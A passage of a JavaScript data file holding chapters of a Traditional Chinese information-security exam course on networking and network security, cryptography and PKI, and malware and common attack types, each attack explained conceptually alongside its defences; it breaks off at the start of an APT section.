/* 科目二：資訊安全技術概論 */
window.CHAPTERS = window.CHAPTERS || [];
window.CHAPTERS.push(
{
  id: 'c09', subject: 2, minutes: 50,
  title: '網路基礎與網路安全',
  summary: 'OSI 七層與 TCP/IP、常見協定與埠號、防火牆種類、IDS/IPS、VPN、DMZ 與無線網路安全。',
  sections: [
    { id: 'osi', title: 'OSI 七層與 TCP/IP 模型', html: `
<div class="table-wrap"><table>
<tr><th>層</th><th>OSI</th><th>TCP/IP</th><th>資料單位</th><th>協定／設備</th><th>常見攻擊</th></tr>
<tr><td>7</td><td><b>應用層</b></td><td rowspan="3">應用層</td><td rowspan="3">資料 Data</td><td>HTTP、DNS、SMTP、FTP、SSH</td><td>SQLi、XSS、釣魚</td></tr>
<tr><td>6</td><td>表現層</td><td>TLS（部分）、JPEG、ASCII 編碼</td><td>—</td></tr>
<tr><td>5</td><td>會議層</td><td>RPC、NetBIOS</td><td>Session 劫持</td></tr>
<tr><td>4</td><td><b>傳輸層</b></td><td>傳輸層</td><td>區段 Segment</td><td>TCP、UDP</td><td>SYN Flood、埠掃描</td></tr>
<tr><td>3</td><td><b>網路層</b></td><td>網際網路層</td><td>封包 Packet</td><td>IP、ICMP、IPsec；<b>路由器</b></td><td>IP 偽造、Ping of Death、Smurf</td></tr>
<tr><td>2</td><td>資料連結層</td><td rowspan="2">網路存取層</td><td>訊框 Frame</td><td>Ethernet、ARP、MAC；<b>交換器</b></td><td>ARP 欺騙、MAC Flooding</td></tr>
<tr><td>1</td><td>實體層</td><td>位元 Bit</td><td>網路線、光纖；集線器</td><td>竊聽、剪線</td></tr>
</table></div>
<div class="box memo"><b class="t">記憶口訣</b>由下而上「<b>實・資・網・傳・會・表・應</b>」；英文 7→1「All People Seem To Need Data Processing」。</div>
<h3>TCP vs. UDP</h3>
<div class="table-wrap"><table>
<tr><th></th><th>TCP</th><th>UDP</th></tr>
<tr><td>連線</td><td>連線導向，需<strong>三向交握</strong></td><td>非連線導向</td></tr>
<tr><td>可靠性</td><td>確認、重送、順序控制</td><td>不保證送達</td></tr>
<tr><td>速度</td><td>較慢</td><td>較快</td></tr>
<tr><td>用途</td><td>網頁、郵件、檔案傳輸</td><td>DNS 查詢、串流、VoIP、DHCP</td></tr>
</table></div>
<p><b>三向交握</b>：Client → <code>SYN</code> → Server → <code>SYN-ACK</code> → Client → <code>ACK</code>。<br><b>SYN Flood</b> 就是大量送出 SYN 卻不回 ACK，塞爆伺服器的半開連線佇列；防禦可用 <b>SYN Cookie</b>。</p>` },
    { id: 'ports', title: '常見協定與埠號（必背）', html: `
<div class="table-wrap"><table>
<tr><th>埠號</th><th>協定</th><th>說明</th><th>安全替代</th></tr>
<tr><td class="mono">20/21</td><td>FTP</td><td>檔案傳輸（20 資料、21 控制），明文</td><td>SFTP(22)、FTPS(990)</td></tr>
<tr><td class="mono">22</td><td>SSH / SFTP</td><td>加密遠端登入與檔案傳輸</td><td>—</td></tr>
<tr><td class="mono">23</td><td>Telnet</td><td>遠端登入，<strong>明文傳輸</strong>，應停用</td><td>SSH(22)</td></tr>
<tr><td class="mono">25</td><td>SMTP</td><td>寄送郵件</td><td>SMTPS(465)／提交 587+STARTTLS</td></tr>
<tr><td class="mono">53</td><td>DNS</td><td>網域名稱解析（UDP/TCP）</td><td>DNSSEC、DoH(443)、DoT(853)</td></tr>
<tr><td class="mono">67/68</td><td>DHCP</td><td>自動分配 IP（UDP）</td><td>DHCP Snooping</td></tr>
<tr><td class="mono">69</td><td>TFTP</td><td>簡易檔案傳輸（UDP），無驗證</td><td>—</td></tr>
<tr><td class="mono">80</td><td>HTTP</td><td>網頁，明文</td><td>HTTPS(443)</td></tr>
<tr><td class="mono">110</td><td>POP3</td><td>收信</td><td>POP3S(995)</td></tr>
<tr><td class="mono">123</td><td>NTP</td><td>時間同步（UDP）</td><td>—</td></tr>
<tr><td class="mono">143</td><td>IMAP</td><td>收信（同步於伺服器）</td><td>IMAPS(993)</td></tr>
<tr><td class="mono">161/162</td><td>SNMP</td><td>網路設備管理（UDP）；v1/v2c 明文 community</td><td>SNMPv3</td></tr>
<tr><td class="mono">389</td><td>LDAP</td><td>目錄服務</td><td>LDAPS(636)</td></tr>
<tr><td class="mono">443</td><td>HTTPS</td><td>HTTP over TLS</td><td>—</td></tr>
<tr><td class="mono">445</td><td>SMB</td><td>Windows 檔案分享（WannaCry 利用）</td><td>關閉對外、SMBv3</td></tr>
<tr><td class="mono">514</td><td>Syslog</td><td>日誌傳送（UDP）</td><td>Syslog over TLS(6514)</td></tr>
<tr><td class="mono">1433</td><td>MS SQL</td><td>資料庫</td><td>不對外開放</td></tr>
<tr><td class="mono">3306</td><td>MySQL</td><td>資料庫</td><td>不對外開放</td></tr>
<tr><td class="mono">3389</td><td>RDP</td><td>Windows 遠端桌面，常遭暴力破解</td><td>VPN + MFA 後再連</td></tr>
</table></div>
<div class="box tip"><b class="t">練習</b>到「互動實驗室」的 <b>埠號挑戰</b>，用遊戲方式把這張表背起來。</div>
<h3>其他基礎協定</h3>
<ul>
  <li><b>ARP</b>：IP 位址 → MAC 位址。沒有驗證機制，因此可被 <b>ARP 欺騙</b> 用於中間人攻擊；防禦：動態 ARP 檢測（DAI）、靜態 ARP。</li>
  <li><b>ICMP</b>：網路診斷（ping、traceroute），可被用於 Ping Flood、Smurf 攻擊。</li>
  <li><b>DNS</b>：網域 → IP。攻擊有 <b>DNS 快取毒害</b>、DNS 劫持、DNS 放大攻擊、DNS 通道（資料外洩）；防禦：<b>DNSSEC</b>（以數位簽章確保 DNS 回應完整性與來源）。</li>
  <li><b>NAT</b>：私有 IP 轉換為公有 IP，隱藏內部網路結構。私有 IP 範圍：<code>10.0.0.0/8</code>、<code>172.16.0.0/12</code>、<code>192.168.0.0/16</code>。</li>
</ul>` },
    { id: 'firewall', title: '防火牆', html: `
<div class="table-wrap"><table>
<tr><th>類型</th><th>運作層</th><th>說明</th></tr>
<tr><td><b>封包過濾</b> Packet Filter</td><td>L3/L4</td><td>依來源／目的 IP、埠、協定判斷；速度快但無法辨識連線狀態與內容</td></tr>
<tr><td><b>狀態檢測</b> Stateful Inspection</td><td>L3/L4</td><td>記錄連線狀態表，只讓已建立連線的回應封包通過</td></tr>
<tr><td><b>應用層閘道／代理</b> Proxy</td><td>L7</td><td>代替用戶端與伺服器溝通，可檢查內容；較慢</td></tr>
<tr><td><b>次世代防火牆</b> NGFW</td><td>L3～L7</td><td>整合應用程式辨識、IPS、使用者識別、SSL 解密、威脅情資</td></tr>
<tr><td><b>網頁應用程式防火牆</b> WAF</td><td>L7</td><td>專門保護 Web 應用，阻擋 <strong>SQL 注入、XSS</strong> 等</td></tr>
<tr><td>UTM</td><td>多層</td><td>統一威脅管理：防火牆 + 防毒 + IPS + 內容過濾等整合於一機，適合中小企業</td></tr>
</table></div>
<h3>規則設計重點</h3>
<ul>
  <li>規則<strong>由上而下比對</strong>，符合第一條就執行；最後一條應為<b>預設拒絕（Deny All）</b>。</li>
  <li>具體規則放前面，廣泛規則放後面。</li>
  <li>同時管控<b>進入（Ingress）</b>與<b>外出（Egress）</b>流量——限制外出可阻止中毒主機回連 C2。</li>
  <li>定期審查規則，移除過期或過寬的規則（如 any-any）。</li>
</ul>
<h3>DMZ（非軍事區）</h3>
<p>介於外部網路與內部網路之間的區段，放置<strong>需要對外提供服務</strong>的伺服器（Web、Mail、DNS）。即使 DMZ 主機被入侵，攻擊者仍需再突破一道防火牆才能進入內網。</p>
<p class="mono center">Internet ⇄ [外部防火牆] ⇄ DMZ（Web/Mail） ⇄ [內部防火牆] ⇄ 內部網路（DB/員工）</p>` },
    { id: 'ids', title: 'IDS／IPS 與其他網路防護', html: `
<div class="table-wrap"><table>
<tr><th></th><th>IDS 入侵偵測系統</th><th>IPS 入侵防禦系統</th></tr>
<tr><td>部署</td><td>旁路（Out-of-band），透過鏡像埠（SPAN）監聽</td><td><strong>串接（Inline）</strong>在流量路徑上</td></tr>
<tr><td>動作</td><td>偵測、<strong>告警</strong></td><td>偵測並<strong>主動阻擋</strong></td></tr>
<tr><td>風險</td><td>不影響網路</td><td>誤判會擋到正常流量；設備故障可能影響連線</td></tr>
</table></div>
<h3>偵測方法</h3>
<ul>
  <li><b>特徵式（Signature-based）</b>：比對已知攻擊特徵，誤報低，但<strong>無法偵測未知攻擊（零時差）</strong>，需持續更新特徵庫。</li>
  <li><b>異常式（Anomaly-based）</b>：先建立正常行為基準，偏離即告警，可發現未知攻擊，但<strong>誤報率較高</strong>。</li>
</ul>
<p><b>HIDS/HIPS</b> 安裝在主機上；<b>NIDS/NIPS</b> 部署在網路上。</p>
<h3>偵測結果四種情況</h3>
<div class="table-wrap"><table>
<tr><th></th><th>真的有攻擊</th><th>沒有攻擊</th></tr>
<tr><td>系統告警</td><td>真陽性 TP（正確告警）</td><td><b>誤報（偽陽性）FP</b>：狼來了</td></tr>
<tr><td>系統沒告警</td><td><b>漏報（偽陰性）FN</b>：<strong>最危險</strong></td><td>真陰性 TN（正確放行）</td></tr>
</table></div>
<h3>其他防護</h3>
<ul>
  <li><b>蜜罐（Honeypot）</b>：故意佈置的誘餌系統，吸引攻擊者並蒐集手法；多個組成<b>蜜網</b>。</li>
  <li><b>網路分段／VLAN</b>：依功能切分網段，限制橫向移動。</li>
  <li><b>NAC 網路存取控制</b>：設備接入前檢查身分與健康狀態（如 802.1X）。</li>
  <li><b>代理伺服器、內容過濾、負載平衡、Anti-DDoS 清洗服務</b>。</li>
</ul>` },
    { id: 'vpn', title: 'VPN 與無線網路安全', html: `
<p><b>VPN（虛擬私人網路）</b>在公共網路上建立加密通道。</p>
<ul>
  <li><b>IPsec VPN</b>：運作在<strong>網路層</strong>，常用於站對站（Site-to-Site）。
    <ul>
      <li><b>AH</b>（驗證標頭）：提供完整性與來源驗證，<strong>不加密</strong>。</li>
      <li><b>ESP</b>（封裝安全酬載）：提供<strong>加密</strong>＋完整性。</li>
      <li><b>傳輸模式</b>只加密酬載；<b>通道模式</b>加密整個原始封包（VPN 閘道常用）。</li>
      <li><b>IKE</b>：負責金鑰交換與建立安全關聯（SA）。</li>
    </ul></li>
  <li><b>SSL/TLS VPN</b>：透過瀏覽器或輕量用戶端，適合遠端員工連入。</li>
  <li><b>分割通道（Split Tunneling）</b>：只有公司流量走 VPN，方便但風險較高。</li>
</ul>
<h3>Wi-Fi 安全協定</h3>
<div class="table-wrap"><table>
<tr><th>協定</th><th>加密</th><th>安全性</th></tr>
<tr><td>WEP</td><td>RC4 + 24 位元 IV</td><td>已被破解，禁止使用</td></tr>
<tr><td>WPA</td><td>TKIP（RC4）</td><td>過時</td></tr>
<tr><td>WPA2</td><td><b>AES-CCMP</b></td><td>可用，但有 KRACK 漏洞、PSK 可離線字典攻擊</td></tr>
<tr><td><b>WPA3</b></td><td>AES，<b>SAE</b> 取代 PSK 握手</td><td>建議，具前向保密、抗離線字典攻擊</td></tr>
</table></div>
<p>企業模式（Enterprise）使用 <b>802.1X + RADIUS</b> 為每位使用者個別驗證；個人模式（Personal）使用共用密碼（PSK/SAE）。</p>
<h3>無線攻擊</h3>
<ul>
  <li><b>惡意雙胞胎（Evil Twin）</b>：架設與合法熱點同名的假 AP，誘騙連線進行中間人攻擊。</li>
  <li><b>非法 AP（Rogue AP）</b>：員工私接的未授權 AP，形成內網後門。</li>
  <li><b>解除驗證攻擊（Deauth）</b>、<b>藍牙攻擊</b>（Bluejacking 傳送垃圾訊息、Bluesnarfing 竊取資料）。</li>
</ul>
<div class="box tip"><b class="t">小提醒</b>隱藏 SSID 與 MAC 位址過濾都很容易被繞過，只能算輔助手段，不能當作主要防護。</div>` }
  ],
  keypoints: [
    'OSI 七層：實資網傳會表應；路由器 L3、交換器 L2',
    'TCP 三向交握 SYN → SYN-ACK → ACK；SYN Flood 用 SYN Cookie 防',
    '必背埠：21 FTP、22 SSH、23 Telnet、25 SMTP、53 DNS、80/443、445 SMB、3389 RDP',
    '狀態檢測防火牆追蹤連線；WAF 防 SQLi/XSS；最後一條 Deny All',
    'DMZ 放對外服務；IDS 告警（旁路）、IPS 阻擋（串接）',
    '特徵式無法偵測零時差；漏報（FN）最危險',
    'IPsec：AH 不加密、ESP 加密；Wi-Fi 用 WPA3，WEP 禁用'
  ]
},
{
  id: 'c10', subject: 2, minutes: 50,
  title: '密碼學與 PKI',
  summary: '對稱與非對稱加密、雜湊函數、數位簽章、PKI 與數位憑證、TLS 運作與常見密碼攻擊。',
  sections: [
    { id: 'basic', title: '密碼學基本概念', html: `
<ul>
  <li><b>明文（Plaintext）</b>→ 加密 →<b>密文（Ciphertext）</b>→ 解密 → 明文。</li>
  <li><b>演算法</b>是公開的，安全性取決於<b>金鑰</b>的保密——這就是<strong>克克霍夫原則（Kerckhoffs's Principle）</strong>。</li>
  <li><b>金鑰長度</b>越長，暴力破解越困難（每增加 1 位元，可能組合數 ×2）。</li>
</ul>
<h3>古典密碼</h3>
<ul>
  <li><b>替換式（Substitution）</b>：凱薩密碼（每個字母位移 3）、維吉尼亞密碼。</li>
  <li><b>移位式（Transposition）</b>：字母不變，打亂順序。</li>
  <li><b>一次性密碼本（OTP）</b>：金鑰與明文一樣長、真隨機、只用一次——理論上<strong>無法破解</strong>，但金鑰配送困難。</li>
</ul>
<p>可以到「互動實驗室」玩玩 <b>凱薩密碼</b>。</p>
<h3>加密可以提供什麼？</h3>
<div class="table-wrap"><table>
<tr><th>技術</th><th>機密性</th><th>完整性</th><th>來源驗證</th><th>不可否認</th></tr>
<tr><td>對稱式加密</td><td class="mark">●</td><td></td><td></td><td></td></tr>
<tr><td>非對稱式加密（公鑰加密）</td><td class="mark">●</td><td></td><td></td><td></td></tr>
<tr><td>雜湊函數</td><td></td><td class="mark">●</td><td></td><td></td></tr>
<tr><td>HMAC / MAC</td><td></td><td class="mark">●</td><td class="mark">●</td><td>否（雙方共享金鑰）</td></tr>
<tr><td><b>數位簽章</b></td><td></td><td class="mark">●</td><td class="mark">●</td><td class="mark">●</td></tr>
</table></div>` },
    { id: 'sym', title: '對稱式加密', html: `
<p>加密與解密使用<strong>同一把金鑰</strong>（又稱秘密金鑰、共享金鑰）。</p>
<div class="concepts">
  <div class="concept"><b>優點</b><span>速度快，適合加密大量資料</span></div>
  <div class="concept"><b>缺點：金鑰配送</b><span>如何安全把金鑰交給對方？</span></div>
  <div class="concept"><b>缺點：金鑰數量</b><span>n 個人兩兩通訊需要 <b>n(n−1)/2</b> 把金鑰</span></div>
</div>
<div class="table-wrap"><table>
<tr><th>演算法</th><th>區塊／金鑰長度</th><th>狀態</th></tr>
<tr><td>DES</td><td>64 位元區塊、<b>56 位元</b>有效金鑰</td><td>已不安全</td></tr>
<tr><td>3DES</td><td>三次 DES，112/168 位元</td><td>已淘汰（NIST 2023 後停用）</td></tr>
<tr><td><b>AES</b>（Rijndael）</td><td><b>128 位元區塊</b>；金鑰 128/192/256</td><td>目前標準</td></tr>
<tr><td>Blowfish / Twofish</td><td>可變</td><td>Twofish 為 AES 決選演算法</td></tr>
<tr><td>RC4</td><td>串流加密</td><td>不安全（WEP 使用）</td></tr>
<tr><td>ChaCha20</td><td>串流加密</td><td>行動裝置常用（TLS 1.3）</td></tr>
</table></div>
<h3>區塊加密的運作模式</h3>
<ul>
  <li><b>ECB</b>：每區塊獨立加密，相同明文 → 相同密文，<strong>會洩漏資料模式</strong>，不建議使用（著名的「ECB 企鵝」）。</li>
  <li><b>CBC</b>：前一區塊密文與下一區塊明文 XOR，需 IV。</li>
  <li><b>CTR</b>：計數器模式，可平行處理。</li>
  <li><b>GCM</b>：CTR + 認證，同時提供<strong>機密性與完整性</strong>（AEAD），TLS 1.3 主流。</li>
</ul>
<p>另有<b>串流加密</b>（Stream Cipher）：逐位元／位元組加密，如 RC4、ChaCha20。</p>` },
    { id: 'asym', title: '非對稱式加密（公開金鑰）', html: `
<p>每個人有一對金鑰：<b>公鑰</b>（公開給所有人）與<b>私鑰</b>（只有自己保管）。用其中一把加密，只能用另一把解密。n 人通訊只需 <b>2n</b> 把金鑰。</p>
<div class="concepts">
  <div class="concept"><b>要保密 → 用「收件者公鑰」加密</b><span>只有收件者的私鑰能解開，確保機密性。</span></div>
  <div class="concept"><b>要簽章 → 用「寄件者私鑰」簽署</b><span>任何人都能用寄件者公鑰驗證，確保來源與不可否認。</span></div>
</div>
<div class="box memo"><b class="t">記憶口訣</b>「<b>加密用對方的公鑰，簽章用自己的私鑰</b>」——私鑰永遠不離開自己。</div>
<div class="table-wrap"><table>
<tr><th>演算法</th><th>數學基礎</th><th>用途</th></tr>
<tr><td><b>RSA</b></td><td>大質數因數分解</td><td>加密、數位簽章、金鑰交換；建議 2048 位元以上</td></tr>
<tr><td><b>Diffie-Hellman（DH）</b></td><td>離散對數</td><td><strong>只用於金鑰交換</strong>，不能加密或簽章；本身無身分驗證，易受中間人攻擊</td></tr>
<tr><td><b>ECC 橢圓曲線</b></td><td>橢圓曲線離散對數</td><td>以<strong>較短金鑰</strong>達到同等安全（256 位元 ECC ≈ 3072 位元 RSA），適合行動裝置</td></tr>
<tr><td>DSA / ECDSA</td><td>離散對數</td><td>數位簽章</td></tr>
<tr><td>ElGamal</td><td>離散對數</td><td>加密與簽章</td></tr>
</table></div>
<h3>混合式加密（實務做法）</h3>
<p>非對稱加密很慢，所以實務上：<strong>用非對稱加密交換一把隨機的「對稱會議金鑰」，再用對稱加密傳送大量資料</strong>。HTTPS/TLS、PGP 都是這樣運作。</p>
<div class="box tip"><b class="t">後量子密碼學</b>量子電腦未來可能破解 RSA 與 ECC。NIST 已於 2024 年發布後量子密碼標準（如 ML-KEM、ML-DSA），組織應開始盤點加密資產，規劃遷移。</div>` },
    { id: 'hash', title: '雜湊函數與數位簽章', html: `
<p><b>雜湊函數（Hash）</b>把任意長度的輸入轉換成<strong>固定長度</strong>的輸出（摘要），具備：</p>
<ul>
  <li><b>單向性</b>：無法從雜湊值反推原文。</li>
  <li><b>抗碰撞性</b>：很難找到兩個不同輸入有相同雜湊值。</li>
  <li><b>雪崩效應</b>：輸入改一個字，輸出完全不同。</li>
</ul>
<div class="table-wrap"><table>
<tr><th>演算法</th><th>輸出長度</th><th>狀態</th></tr>
<tr><td>MD5</td><td>128 位元</td><td>已發現碰撞，不可用於安全用途</td></tr>
<tr><td>SHA-1</td><td>160 位元</td><td>2017 年 SHAttered 實際碰撞</td></tr>
<tr><td><b>SHA-256</b>（SHA-2 家族）</td><td>256 位元</td><td>主流</td></tr>
<tr><td>SHA-3</td><td>可變</td><td>安全，採不同設計（Keccak）</td></tr>
</table></div>
<div class="box warn"><b class="t">易錯</b>雜湊<b>不是加密</b>，因為無法解密，沒有金鑰；Base64 也<b>不是加密</b>，只是編碼，任何人都能還原。</div>
<h3>密碼儲存：加鹽（Salt）</h3>
<p>直接存密碼雜湊會被<b>彩虹表（Rainbow Table）</b>反查。<strong>加鹽</strong>是為每個帳號產生隨機值，與密碼一起雜湊，讓相同密碼也有不同雜湊值，使彩虹表失效。再搭配 bcrypt、Argon2 等<strong>刻意變慢</strong>的演算法（Key Stretching）抵抗暴力破解。</p>
<h3>數位簽章流程</h3>
<div class="flow">
  <div><b>1. 計算雜湊</b><span>寄件者對文件算出摘要</span></div>
  <div><b>2. 私鑰簽署</b><span>用<strong>寄件者私鑰</strong>加密摘要 = 簽章</span></div>
  <div><b>3. 傳送</b><span>文件 + 簽章</span></div>
  <div><b>4. 驗證</b><span>收件者用<strong>寄件者公鑰</strong>解出摘要，與自己算的摘要比對</span></div>
</div>
<p>數位簽章提供<strong>完整性、來源驗證、不可否認性</strong>，但<b>不提供機密性</b>（文件本身沒加密）。</p>
<p>到「互動實驗室」試試 <b>SHA-256 雜湊</b>，體驗雪崩效應。</p>` },
    { id: 'pki', title: 'PKI 與數位憑證', html: `
<p>公鑰怎麼確定真的是「那個人」的？靠<b>公開金鑰基礎建設（PKI）</b>由可信任的第三方擔保。</p>
<ul>
  <li><b>CA（憑證機構）</b>：簽發與撤銷憑證，以<strong>CA 的私鑰</strong>簽署憑證。</li>
  <li><b>RA（註冊機構）</b>：驗證申請者身分，再交由 CA 簽發。</li>
  <li><b>數位憑證（X.509）</b>：內容包含版本、序號、簽章演算法、<b>簽發者</b>、<b>有效期間</b>、<b>主體</b>、<b>主體的公鑰</b>、CA 的數位簽章。<strong>憑證裡沒有私鑰</strong>。</li>
  <li><b>信任鏈</b>：根憑證（Root CA）→ 中繼 CA → 終端實體憑證。瀏覽器／作業系統預先內建受信任的根憑證。</li>
</ul>
<h3>憑證撤銷</h3>
<ul>
  <li><b>CRL（憑證廢止清單）</b>：CA 定期發布被撤銷憑證的清單。</li>
  <li><b>OCSP（線上憑證狀態協定）</b>：即時查詢單一憑證狀態；<b>OCSP Stapling</b> 由伺服器代為附上查詢結果。</li>
</ul>
<p>私鑰外洩、資料變更、員工離職時應撤銷憑證。</p>
<div class="box tip"><b class="t">台灣實例</b>自然人憑證（內政部憑證管理中心 MOICA）、工商憑證（經濟部 MOEACA）、政府機關憑證（GCA）。</div>` },
    { id: 'tls', title: 'TLS / HTTPS 與密碼攻擊', html: `
<p><b>TLS</b>（前身 SSL）保護 HTTPS、SMTPS 等傳輸。<strong>SSL 2.0/3.0、TLS 1.0/1.1 都已淘汰</strong>，應使用 <b>TLS 1.2 或 1.3</b>。</p>
<h3>TLS 握手簡化流程</h3>
<div class="flow">
  <div><b>Client Hello</b><span>支援的版本、加密套件、隨機數</span></div>
  <div><b>Server Hello + 憑證</b><span>伺服器送出 X.509 憑證</span></div>
  <div><b>驗證憑證</b><span>用戶端以信任鏈驗證</span></div>
  <div><b>金鑰交換</b><span>(EC)DHE 協商出會議金鑰</span></div>
  <div><b>加密通訊</b><span>以對稱加密（如 AES-GCM）傳資料</span></div>
</div>
<ul>
  <li><b>前向保密（PFS）</b>：每次連線使用臨時金鑰（DHE/ECDHE），即使伺服器私鑰日後外洩，過去的流量也無法解密。TLS 1.3 強制 PFS。</li>
  <li><b>HSTS</b>：要求瀏覽器只能用 HTTPS 連線，防止 SSL Stripping（降級為 HTTP）。</li>
</ul>
<h3>常見密碼攻擊</h3>
<div class="table-wrap"><table>
<tr><th>攻擊</th><th>說明</th></tr>
<tr><td>暴力破解 Brute Force</td><td>嘗試所有可能組合</td></tr>
<tr><td>字典攻擊 Dictionary</td><td>使用常見密碼清單嘗試</td></tr>
<tr><td>彩虹表 Rainbow Table</td><td>預先計算的雜湊對照表；用<strong>加鹽</strong>防禦</td></tr>
<tr><td>密碼噴灑 Password Spraying</td><td>用少數常見密碼嘗試<strong>大量帳號</strong>，避開帳號鎖定</td></tr>
<tr><td>撞庫 Credential Stuffing</td><td>拿其他網站外洩的帳密來登入；用 MFA 與不重複密碼防禦</td></tr>
<tr><td>生日攻擊 Birthday Attack</td><td>利用機率尋找雜湊碰撞</td></tr>
<tr><td>中間人攻擊 MITM</td><td>攔截並冒充雙方；用憑證驗證與 PFS 防禦</td></tr>
<tr><td>降級攻擊 Downgrade</td><td>迫使雙方改用較弱的協定（如 POODLE）</td></tr>
<tr><td>重送攻擊 Replay</td><td>擷取合法封包再次送出；用時間戳記、Nonce、序號防禦</td></tr>
<tr><td>旁通道攻擊 Side-channel</td><td>分析耗電、時間、電磁波推測金鑰</td></tr>
<tr><td>已知明文／選擇明文攻擊</td><td>攻擊者擁有明文密文對，用來推導金鑰</td></tr>
</table></div>
<h3>隱寫術（Steganography）</h3>
<p>把資訊藏在圖片、音訊等載體中，<strong>隱藏「訊息存在」這件事</strong>；加密則是讓內容看不懂。浮水印也屬類似技術。</p>` }
  ],
  keypoints: [
    '對稱：同一把金鑰、速度快、有金鑰配送問題；n 人需 n(n−1)/2 把',
    'AES 為現行標準（128 位元區塊）；DES 只有 56 位元，已不安全',
    '加密用收件者公鑰；簽章用寄件者私鑰',
    'DH 只能做金鑰交換；ECC 金鑰短效率高',
    '雜湊：單向、固定長度；MD5/SHA-1 已不安全；加鹽防彩虹表',
    '數位簽章提供完整性、來源驗證、不可否認，不提供機密性',
    '憑證含公鑰不含私鑰；CRL/OCSP 查撤銷；使用 TLS 1.2/1.3'
  ]
},
{
  id: 'c11', subject: 2, minutes: 45,
  title: '惡意程式與常見攻擊手法',
  summary: '病毒、蠕蟲、木馬、勒索軟體等惡意程式；DoS/DDoS、中間人、APT、供應鏈攻擊與攻擊鏈模型。',
  sections: [
    { id: 'malware', title: '惡意程式家族', html: `
<div class="table-wrap"><table>
<tr><th>類型</th><th>特徵</th></tr>
<tr><td><b>病毒 Virus</b></td><td>依附在宿主檔案，<strong>需使用者執行</strong>才會感染與複製</td></tr>
<tr><td><b>蠕蟲 Worm</b></td><td><strong>不需宿主、可自我複製並透過網路自動擴散</strong>（如 WannaCry 利用 SMB 漏洞）</td></tr>
<tr><td><b>木馬 Trojan</b></td><td>偽裝成正常程式，<strong>不會自我複製</strong>，暗中開後門</td></tr>
<tr><td><b>勒索軟體 Ransomware</b></td><td>加密檔案要求贖金；現在常見<strong>雙重勒索</strong>（加密 + 威脅公開竊取的資料）</td></tr>
<tr><td><b>間諜軟體 Spyware</b></td><td>暗中蒐集使用者資訊</td></tr>
<tr><td><b>鍵盤側錄 Keylogger</b></td><td>記錄鍵盤輸入以竊取帳密</td></tr>
<tr><td><b>廣告軟體 Adware</b></td><td>強制顯示廣告</td></tr>
<tr><td><b>Rootkit</b></td><td>取得最高權限並<strong>隱藏自身</strong>，修改系統核心，極難偵測，通常需重灌</td></tr>
<tr><td><b>後門 Backdoor</b></td><td>繞過正常驗證的秘密通道</td></tr>
<tr><td><b>邏輯炸彈 Logic Bomb</b></td><td>特定條件（日期、事件）觸發，常見於心懷不滿的內部人員</td></tr>
<tr><td><b>殭屍網路 Botnet</b></td><td>大量被控制的主機（殭屍），由 <b>C&C／C2 伺服器</b>指揮，常用於 DDoS、垃圾郵件</td></tr>
<tr><td><b>無檔案惡意程式 Fileless</b></td><td>只存在記憶體、利用 PowerShell 等合法工具（Living off the Land），傳統防毒難以偵測</td></tr>
<tr><td><b>挖礦程式 Cryptojacking</b></td><td>偷用受害者運算資源挖加密貨幣</td></tr>
<tr><td>多型／變形病毒</td><td>每次感染改變外觀（Polymorphic／Metamorphic），規避特徵碼偵測</td></tr>
</table></div>
<div class="box exam"><b class="t">考點提示</b>病毒 vs. 蠕蟲：差在<b>是否需要宿主與使用者動作</b>。木馬：<b>不自我複製</b>。Rootkit：<b>隱匿、高權限</b>。</div>` },
    { id: 'dos', title: 'DoS 與 DDoS', html: `
<p><b>阻斷服務（DoS）</b>讓服務無法正常提供，破壞<strong>可用性</strong>；<b>分散式阻斷服務（DDoS）</b>則由大量來源（常為殭屍網路）同時攻擊。</p>
<div class="table-wrap"><table>
<tr><th>攻擊</th><th>原理</th></tr>
<tr><td>SYN Flood</td><td>大量 SYN 不完成交握，耗盡連線資源</td></tr>
<tr><td>UDP Flood / ICMP Flood</td><td>大量封包塞爆頻寬</td></tr>
<tr><td><b>Smurf</b></td><td>偽造受害者 IP，對<strong>廣播位址</strong>送 ICMP Echo，所有主機回應受害者</td></tr>
<tr><td>Ping of Death</td><td>送出超過 65,535 位元組的畸形 ICMP 封包</td></tr>
<tr><td>Teardrop</td><td>重疊的封包片段，使重組失敗</td></tr>
<tr><td>Land</td><td>來源與目的 IP 相同</td></tr>
<tr><td><b>放大攻擊 Amplification</b></td><td>偽造來源 IP，利用 DNS、NTP、Memcached 等「小請求、大回應」反射攻擊受害者</td></tr>
<tr><td>HTTP Flood / Slowloris</td><td>應用層攻擊：大量請求或慢速佔住連線</td></tr>
</table></div>
<p><b>防禦</b>：Anti-DDoS 清洗中心、CDN、流量限速（Rate Limiting）、SYN Cookie、關閉不必要服務、過濾偽造來源（BCP 38 Ingress Filtering）、備援頻寬。</p>` },
    { id: 'net', title: '網路與身分攻擊', html: `
<div class="table-wrap"><table>
<tr><th>攻擊</th><th>說明</th><th>防禦</th></tr>
<tr><td><b>中間人 MITM</b></td><td>攔截並可能竄改雙方通訊</td><td>TLS、憑證驗證、HSTS、VPN</td></tr>
<tr><td><b>ARP 欺騙</b></td><td>偽造 ARP 回應，把流量導向攻擊者</td><td>DAI、靜態 ARP</td></tr>
<tr><td><b>DNS 快取毒害</b></td><td>在 DNS 快取放入假紀錄，把使用者導向假網站</td><td>DNSSEC</td></tr>
<tr><td><b>網址嫁接 Pharming</b></td><td>竄改 DNS 或 hosts 檔，即使輸入正確網址也被導到假站</td><td>DNSSEC、端點防護</td></tr>
<tr><td><b>Session 劫持</b></td><td>竊取 Session ID / Cookie 冒充使用者</td><td>HTTPS、Cookie 設 Secure/HttpOnly、登入後重新產生 Session ID</td></tr>
<tr><td><b>IP 偽造 Spoofing</b></td><td>偽造來源 IP</td><td>入口過濾</td></tr>
<tr><td><b>MAC Flooding</b></td><td>塞爆交換器 MAC 表，使其變成像集線器般廣播</td><td>Port Security</td></tr>
<tr><td><b>VLAN Hopping</b></td><td>跳到其他 VLAN</td><td>關閉自動 Trunk、變更原生 VLAN</td></tr>
<tr><td><b>Pass-the-Hash</b></td><td>不需明文密碼，直接用竊得的雜湊值驗證（Windows NTLM）</td><td>限制特權帳號、Credential Guard</td></tr>
<tr><td><b>錯字網域 Typosquatting</b></td><td>註冊相似網域（g00gle.com）</td><td>使用者警覺、網域監控</td></tr>
</table></div>` },
    { id: 'apt', title: 'APT、供應鏈與攻擊模型', html: `
<ul>
  <li><b>APT（進階持續性威脅）</b>：有組織、資源充足（常具國家背景）、針對特定目標、<strong>長期潛伏</strong>竊取資料。常以魚叉式釣魚為入口，再橫向移動。</li>
